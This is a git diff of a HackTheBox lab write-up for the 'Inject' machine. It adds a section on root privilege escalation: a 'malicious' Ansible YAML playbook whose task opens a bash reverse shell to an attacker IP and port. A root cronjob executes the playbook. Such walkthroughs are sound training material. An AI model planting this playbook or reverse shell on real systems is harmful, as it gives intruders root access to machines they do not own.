@@ -1,4 +1,4 @@
-# Inject
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/26598249-49ef-4568-9fc9-299ee24bd25d)# Inject
 > Write-up author: jon-brandy
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/badbc336-8df3-4625-b604-12ca012c8b9a)
@@ -173,8 +173,22 @@ fc6d1634e2f5babf342a0cf22ac541bd
 37. Remembering **phil** is a member of user group --> **staff**. Hence it allows us to create another .yaml file which has our reverse shell payload.
 38. With this we can gain root!
 
-> MALICIOUS .YAML FILE
+> NORMAL .YAML FILE
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/05b35fa0-fd1f-4988-b47f-5df555a15aa0)
+
+
+> MALICIOUS .YAML/.YML FILE
+
+```txt
+- hosts: localhost
+  tasks:
+  - name: Checking webapp service
+    shell: bash -c 'bash -i>& /dev/tcp/10.10.16.23/1337 0>&1'
 ```
 
-```
+39. Creates in at our local machine then run wget to send it there. Wait for minutes, after cronjob exec it, we got the root shell.
+
+> RESULT
+
+
